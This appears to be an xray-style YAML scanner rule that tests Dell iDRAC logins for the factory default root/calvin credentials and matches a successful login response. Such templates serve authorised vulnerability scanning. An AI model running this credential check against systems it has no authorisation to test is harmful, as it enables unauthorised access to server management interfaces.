name: poc-yaml-dell-idrac-default-password
manual: true
transport: http
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /data/login
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: user=root&password=calvin
            follow_redirects: false
        expression: response.status == 200 && response.body.bcontains(b"<authResult>0</authResult>") && response.body.bcontains(b"<forwardUrl>index.html</forwardUrl>")
expression: r0()
detail:
    author: For3stCo1d (https://github.com/For3stCo1d)
    links:
        - https://www.dell.com/support/kbdoc/zh-cn/000133536/dell-poweredge-idrac-%E7%9A%84-%E9%BB%98%E8%AE%A4-%E7%94%A8%E6%88%B7%E5%90%8D-%E5%92%8C-%E5%AF%86%E7%A0%81-%E6%98%AF-%E4%BB%80%E4%B9%88